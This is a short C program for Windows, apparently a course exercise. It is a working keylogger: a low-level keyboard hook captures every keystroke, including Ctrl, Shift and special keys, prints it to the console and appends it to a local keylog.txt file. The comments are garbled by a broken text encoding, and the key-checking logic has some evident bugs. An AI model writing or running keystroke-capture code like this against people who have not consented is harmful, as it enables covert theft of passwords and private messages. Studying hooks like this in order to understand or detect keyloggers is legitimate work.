#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>

HHOOK hHook;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	FILE* fp;
	fp = fopen("D:\\COM\\P4C\\W6\\keylog.txt", "at");	//"keylog.txt" ���Ͽ� �α� ����

	if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
	{
		PKBDLLHOOKSTRUCT pKey = (PKBDLLHOOKSTRUCT)lParam;

		if (nCode >= 0 && (int)wParam == 256)	//���μ����� �޽����� �ִ� ���
		{
			if ((GetAsyncKeyState(VK_LCONTROL) & 0x8000) || (GetAsyncKeyState(VK_RCONTROL) & 0x8000))	//��� ctrl�� ���� ����
			{
				printf("Ctrl + ");
				fprintf(fp, "Ctrl + \n");
			}
			else if ((GetAsyncKeyState(VK_LSHIFT) & 0x8000) || (GetAsyncKeyState(VK_RSHIFT) & 0x8000))	//��� shift�� ���� ����
			{
				printf("Shift + ");
				fprintf(fp, "Shift + \n");
			}
					
			if ((GetAsyncKeyState(VK_LCONTROL) != 0x8000) & VK_LCONTROL == pKey->vkCode || VK_RCONTROL == pKey->vkCode)	//ctrl �ߺ������ ���ƺ��� ������ ����
			{
				printf("Ctrl \n");
				fprintf(fp, "Crtl \n");
			}
			else if ((GetAsyncKeyState(VK_LSHIFT) & 0x8000) & VK_LSHIFT == pKey->vkCode || VK_RSHIFT == pKey->vkCode)	//shift �ߺ������ ���ƺ��� ������ ����
			{
				printf("Shift \n");
				fprintf(fp, "Shift \n");
			}
			else if (VK_RETURN == pKey->vkCode)
			{
				printf("Enter \n");
				fprintf(fp, "Enter \n");
			}
			else if (VK_SPACE == pKey->vkCode)
			{
				printf("Space \n");
				fprintf(fp, "Space \n");
			}
			else if (VK_BACK == pKey->vkCode)
			{
				printf("Backspace \n");
				fprintf(fp, "Backspace \n");
			}
			else if (VK_MENU == pKey->vkCode)
			{
				printf("Alt \n");
				fprintf(fp, "Alt \n");
			}
			else if (VK_CAPITAL == pKey->vkCode)
			{
				printf("CAPS LOCK \n");
				fprintf(fp, "CAPS LOCK \n");
			}
			else if (VK_TAB == pKey->vkCode)
			{
				printf("Tab \n");
				fprintf(fp, "Tab \n");
			}
			else if (VK_ESCAPE == pKey->vkCode)
			{
				printf("Escape \n");
				fprintf(fp, "Escape \n");
			}
			else if (VK_LWIN == pKey->vkCode)
			{
				printf("Windows \n");
				fprintf(fp, "Windows \n");
			}
			else   //�׿� ���ڵ�(����, ���ĺ�)
			{
				printf("%c \n", pKey->vkCode);
				fprintf(fp, "%c \n", pKey->vkCode);
			}
		}
	}

	CallNextHookEx(hHook, nCode, wParam, lParam);	//nCode < 0 : ���μ����� �޽����� ���� ���

	fclose(fp);

	return 0;
}

int main()
{
	HMODULE hInstance = GetModuleHandle(NULL);	//�ڽ��� module���� �����´�.

	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, NULL);	//��ŷ ���ν����� ��ġ

	MSG msg;
	GetMessage(&msg, NULL, NULL, NULL);	//�޽��� ť�� �޽����� ������ MSG����ü�� �����ϰ� TRUE ��ȯ�ϸ�, WM_QUIT�� ��� FALSE�� ��ȯ�Ѵ�.

	UnhookWindowsHookEx(hHook);	//��ġ�� ��ŷ ���ν����� ����

	return 0;
}